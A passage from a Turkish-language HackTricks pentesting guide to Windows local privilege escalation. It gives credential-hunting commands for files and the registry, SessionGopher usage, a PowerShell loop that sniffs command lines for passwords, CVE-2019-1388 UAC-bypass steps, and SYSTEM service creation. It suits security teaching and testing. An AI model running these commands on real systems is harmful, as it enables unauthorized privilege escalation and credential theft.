![](<../../.gitbook/assets/image (729).png>)

Temelde, eğer **çalıştırılacak herhangi bir DLL'yi** **üzerine yazabilirseniz**, o DLL farklı bir kullanıcı tarafından çalıştırılacaksa **yetkileri yükseltebilirsiniz**.

Saldırganların COM Hijacking'i kalıcılık mekanizması olarak nasıl kullandığını öğrenmek için kontrol edin:

{% content-ref url="com-hijacking.md" %}
[com-hijacking.md](com-hijacking.md)
{% endcontent-ref %}

### **Dosyalarda ve kayıt defterinde genel şifre arama**

**Dosya içeriklerini arayın**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Belirli bir dosya adıyla bir dosya arayın**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Anahtar adları ve şifreler için kayıt defterini ara**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Parola arayan araçlar

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **bir msf** eklentisidir. Bu eklentiyi, **kurbanın içindeki kimlik bilgilerini arayan her metasploit POST modülünü otomatik olarak çalıştırmak için** oluşturdum.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) bu sayfada belirtilen parolaları içeren tüm dosyaları otomatik olarak arar.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) bir sistemden parola çıkarmak için başka bir harika araçtır.

[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) aracı, **oturumlar**, **kullanıcı adları** ve **parolaları** açık metin olarak kaydeden çeşitli araçların (PuTTY, WinSCP, FileZilla, SuperPuTTY ve RDP) verilerini arar.
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Sızdırılan İşlemciler

Düşünün ki **SYSTEM olarak çalışan bir işlem** **tam erişimle yeni bir işlem açıyor** (`OpenProcess()`). Aynı işlem **düşük ayrıcalıklarla yeni bir işlem de oluşturuyor** (`CreateProcess()`) **ancak ana işlemin tüm açık işlemcilerini miras alıyor**.\
Sonra, eğer **düşük ayrıcalıklı işleme tam erişiminiz varsa**, `OpenProcess()` ile oluşturulan **ayrıca ayrıcalıklı işleme açık işlemciyi alabilir** ve **bir shellcode enjekte edebilirsiniz**.\
[Bu örneği okuyarak **bu güvenlik açığını nasıl tespit edip istismar edeceğiniz hakkında daha fazla bilgi edinebilirsiniz**.](leaked-handle-exploitation.md)\
[**Farklı izin seviyeleriyle (sadece tam erişim değil) miras alınan işlemler ve iş parçacıkları için daha fazla açık işlemciyi nasıl test edip kötüye kullanacağınız hakkında daha kapsamlı bir açıklama için bu diğer gönderiyi okuyun**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## İsimli Boru İstemcisi Taklidi

Paylaşılan bellek segmentleri, **borular** olarak adlandırılır ve işlem iletişimi ve veri transferini sağlar.

Windows, **İsimli Borular** adı verilen bir özellik sunar; bu, ilgisiz işlemlerin verileri paylaşmasına olanak tanır, hatta farklı ağlar üzerinden bile. Bu, **isimli boru sunucusu** ve **isimli boru istemcisi** olarak tanımlanan rollerle bir istemci/sunucu mimarisine benzer.

Bir **istemci** tarafından bir boru aracılığıyla veri gönderildiğinde, boruyu kuran **sunucu**, gerekli **SeImpersonate** haklarına sahip olması durumunda **istemcinin kimliğini üstlenme** yeteneğine sahiptir. Bir boru aracılığıyla iletişim kuran **ayrıca ayrıcalıklı bir işlemi** taklit etme fırsatı, o işlem boruyla etkileşime girdiğinde o işlemin kimliğini benimseyerek **daha yüksek ayrıcalıklar elde etme** imkanı sunar. Böyle bir saldırıyı gerçekleştirmek için talimatlar [**burada**](named-pipe-client-impersonation.md) ve [**burada**](./#from-high-integrity-to-system) bulunabilir.

Ayrıca, aşağıdaki araç, **burp gibi bir araçla isimli boru iletişimini kesmeyi sağlar:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **ve bu araç, privesc bulmak için tüm boruları listeleyip görmeyi sağlar** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Çeşitli

### **Şifreler için Komut Satırlarını İzleme**

Bir kullanıcı olarak bir shell aldığınızda, **komut satırında kimlik bilgilerini geçiren** planlanmış görevler veya başka işlemler olabilir. Aşağıdaki script, her iki saniyede bir işlem komut satırlarını yakalar ve mevcut durumu önceki durumla karşılaştırarak herhangi bir farkı çıktılar.
```powershell
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Süreçlerden Şifre Çalma

## Düşük Yetkili Kullanıcıdan NT\AUTHORITY SYSTEM'a (CVE-2019-1388) / UAC Atlatma

Grafik arayüzüne (konsol veya RDP aracılığıyla) erişiminiz varsa ve UAC etkinse, bazı Microsoft Windows sürümlerinde yetkisiz bir kullanıcıdan "NT\AUTHORITY SYSTEM" gibi bir terminal veya başka bir süreci çalıştırmak mümkündür.

Bu, aynı anda yetki yükseltme ve UAC'yi atlatma olanağı sağlar. Ayrıca, herhangi bir şey yüklemeye gerek yoktur ve süreç sırasında kullanılan ikili dosya, Microsoft tarafından imzalanmış ve verilmiştir.

Etkilenen sistemlerden bazıları şunlardır:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Bu güvenlik açığını istismar etmek için aşağıdaki adımların gerçekleştirilmesi gerekmektedir:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
Aşağıdaki GitHub deposunda gerekli tüm dosyalar ve bilgiler mevcuttur:

https://github.com/jas502n/CVE-2019-1388

## Yönetici Orta Düzeyden Yüksek Düzey Entegrite Seviyesine / UAC Atlatma

**Entegrite Seviyeleri hakkında bilgi edinmek için bunu okuyun:**

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

Sonra **UAC ve UAC atlatmaları hakkında bilgi edinmek için bunu okuyun:**

{% content-ref url="../authentication-credentials-uac-and-efs/uac-user-account-control.md" %}
[uac-user-account-control.md](../authentication-credentials-uac-and-efs/uac-user-account-control.md)
{% endcontent-ref %}

## **Yüksek Entegriteden Sistem**

### **Yeni hizmet**

Eğer zaten Yüksek Entegrite sürecinde çalışıyorsanız, **SISTEM'e geçiş** sadece **yeni bir hizmet oluşturup çalıştırmak** ile kolay olabilir:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
### AlwaysInstallElevated

Yüksek Bütünlük sürecinden **AlwaysInstallElevated kayıt defteri girişlerini etkinleştirmeyi** ve bir _**.msi**_ sarmalayıcı kullanarak bir ters kabuk **kurmayı** deneyebilirsiniz.\
[Kayıt defteri anahtarları ve bir _.msi_ paketini nasıl kuracağınız hakkında daha fazla bilgi burada.](./#alwaysinstallelevated)

### High + SeImpersonate ayrıcalığını Sisteme

**Kodunuzu** [**buradan bulabilirsiniz**](seimpersonate-from-high-to-system.md)**.**

### SeDebug + SeImpersonate'den Tam Token ayrıcalıklarına

Bu token ayrıcalıklarına sahipseniz (muhtemelen bunu zaten Yüksek Bütünlük sürecinde bulacaksınız), **neredeyse her süreci** (korunan süreçler hariç) SeDebug ayrıcalığı ile **açabilir**, sürecin **token'ını kopyalayabilir** ve o token ile **rastgele bir süreç oluşturabilirsiniz**.\
Bu tekniği kullanmak genellikle **tüm token ayrıcalıklarına sahip olarak SYSTEM olarak çalışan herhangi bir süreci seçmek** şeklindedir (_evet, tüm token ayrıcalıklarına sahip SYSTEM süreçlerini bulabilirsiniz_).\
**Önerilen tekniği uygulayan bir** [**kod örneğini burada bulabilirsiniz**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Adlandırılmış Borular**

Bu teknik, meterpreter tarafından `getsystem`'da yükselmek için kullanılır. Teknik, **bir boru oluşturmayı ve ardından o boruya yazmak için bir hizmet oluşturmayı/istismar etmeyi** içerir. Daha sonra, **boruyu** `SeImpersonate` ayrıcalığı ile oluşturan **sunucu**, boru istemcisinin (hizmetin) **token'ını taklit edebilir** ve SYSTEM ayrıcalıklarını elde edebilir.\
Adlandırılmış borular hakkında [**daha fazla bilgi edinmek istiyorsanız bunu okumalısınız**](./#named-pipe-client-impersonation).\
Yüksek bütünlükten Sistem'e adlandırılmış borular kullanarak geçiş yapma hakkında bir [**örnek okumak istiyorsanız bunu okumalısınız**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Eğer **SYSTEM** olarak çalışan bir **süreç** tarafından **yüklenen bir dll'yi** **ele geçirmeyi** başarırsanız, bu izinlerle rastgele kod çalıştırabilirsiniz. Bu nedenle Dll Hijacking, bu tür ayrıcalık yükseltmeleri için de faydalıdır ve ayrıca, **yüksek bütünlük sürecinden elde edilmesi çok daha kolaydır** çünkü dll'lerin yüklendiği klasörlerde **yazma izinlerine** sahip olacaktır.\
**Dll hijacking hakkında daha fazla bilgi edinebilirsiniz** [**buradan**](dll-hijacking/)**.**

### **Yönetici veya Ağ Servisinden Sisteme**

{% embed url="https://github.com/sailay1996/RpcSsImpersonator" %}

### LOKAL HİZMET veya AĞ HİZMETİ'nden tam ayrıcalıklara

**Oku:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Daha fazla yardım

[Statik impacket ikili dosyaları](https://github.com/ropnop/impacket_static_binaries)

## Kullanışlı araçlar

**Windows yerel ayrıcalık yükseltme vektörlerini aramak için en iyi araç:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Yanlış yapılandırmaları ve hassas dosyaları kontrol et (**[**buradan kontrol edin**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Tespit edildi.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Bazı olası yanlış yapılandırmaları kontrol et ve bilgi topla (**[**buradan kontrol edin**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Yanlış yapılandırmaları kontrol et**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY, WinSCP, SuperPuTTY, FileZilla ve RDP kaydedilmiş oturum bilgilerini çıkarır. Yerel olarak -Thorough kullanın.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Kimlik bilgilerini Credential Manager'dan çıkarır. Tespit edildi.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Toplanan parolaları alan adı üzerinde püskürt**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh, bir PowerShell ADIDNS/LLMNR/mDNS/NBNS sahteleyici ve adam ortada aracı.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Temel privesc Windows envanteri**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- Bilinen privesc zafiyetlerini arayın (WATSON için DEPREKATE)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Yerel kontroller **(Yönetici hakları gerekir)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Bilinen privesc zafiyetlerini arayın (VisualStudio kullanılarak derlenmesi gerekir) ([**önceden derlenmiş**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Yanlış yapılandırmaları arayarak ana bilgisayarı envanterler (privesc'den daha çok bilgi toplama aracı) (derlenmesi gerekir) **(**[**önceden derlenmiş**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Birçok yazılımdan kimlik bilgilerini çıkarır (github'da önceden derlenmiş exe)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp'ın C# portu**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- Yanlış yapılandırmaları kontrol et (github'da önceden derlenmiş çalıştırılabilir). Tavsiye edilmez. Win10'da iyi çalışmıyor.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Olası yanlış yapılandırmaları kontrol et (python'dan exe). Tavsiye edilmez. Win10'da iyi çalışmıyor.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Bu gönderiye dayanan bir araç (doğru çalışması için accesschk'e ihtiyaç duymaz ama kullanabilir).

**Yerel**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** çıktısını okur ve çalışan exploit'leri önerir (yerel python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** çıktısını okur ve çalışan exploit'leri önerir (yerel python)

**Meterpreter**

_multi/recon/local\_exploit\_suggestor_

Projeyi doğru .NET sürümü ile derlemeniz gerekiyor ([bunu görün](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Kurban makinedeki yüklü .NET sürümünü görmek için şunu yapabilirsiniz:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Bibliyografya

* [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)\\
* [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)\\
* [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\\
* [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)\\
* [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)\\
* [https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)\\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)\\
* [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)\\
* [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)\\
* [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\\
* [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)\\
* [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\\
* [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

{% hint style="success" %}
AWS Hacking öğrenin ve pratik yapın:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking öğrenin ve pratik yapın: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**'i takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}
